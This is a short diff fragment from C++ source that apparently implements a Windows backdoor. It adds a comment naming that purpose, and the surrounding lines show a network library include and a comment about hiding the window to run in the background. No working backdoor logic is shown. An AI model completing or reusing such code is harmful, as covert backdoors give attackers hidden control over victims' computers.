@@ -5,7 +5,7 @@
 #include<wininet.h>
 #include<string.h>
 #include<sys/types.h>
-
+// program for making backdoor in the window operating system 
 using namespace std;
 // function for hiding the window for instance to run in backgroud 
 int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev,LPSTR lpCndLine, int nCndShow){
